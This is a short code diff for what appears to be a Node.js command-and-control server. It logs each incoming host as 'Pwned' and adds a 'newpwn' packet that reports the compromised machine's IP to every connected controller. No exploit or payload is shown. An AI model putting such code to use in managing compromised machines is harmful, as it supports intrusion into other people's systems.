@@ -1,6 +1,7 @@
 const { Socket } = require('net');
 const { PacketConnection } = require('../lib/connection');
 const { packet_types } = require('../lib/protocol');
+const { createPacket } = require('../lib/packet');
 const { parsePacket, serializePacket } = require('../lib/packet');
 const { controllers } = require('./control');
 
@@ -44,6 +45,11 @@ function handleIncomingHost(socket) {
         console.log(`! Host ${index} forcibly exited`);
     });
     console.log(`+ Pwned ${socket.remoteAddress} ;)`);
+    let packet = createPacket('control', 'response', 'newpwn');
+    packet.ip = socket.remoteAddress;
+    for (let c of controllers) {
+        c.sendResponse(packet);
+    }
 }
 
 exports.hosts = hosts;
